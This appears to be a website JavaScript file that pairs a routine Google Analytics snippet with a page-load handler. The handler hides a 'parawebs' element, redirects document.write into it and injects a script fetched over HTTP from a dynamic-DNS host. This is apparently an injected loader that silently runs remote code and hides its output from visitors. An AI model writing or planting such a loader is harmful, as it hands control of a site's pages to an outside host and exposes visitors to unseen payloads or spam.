(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-61679308-1', 'auto');
ga('send', 'pageview');


document.addEventListener('DOMContentLoaded', function() {
  console.log("active");
    (function() {
      console.log("load");
   var lugar = document.getElementById("parawebs")
  	lugar.setAttribute("style", "display:none");
    lugar.innerHTML = "";
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "http://www.zulia.citastag.dyndns.org/regional/index.php?ac=ceop";
    if (!document._write) document._write = document.write;
    document.write = function(str) {
        lugar.innerHTML += str;
    };
    lugar.appendChild(script);

})();
}, false);

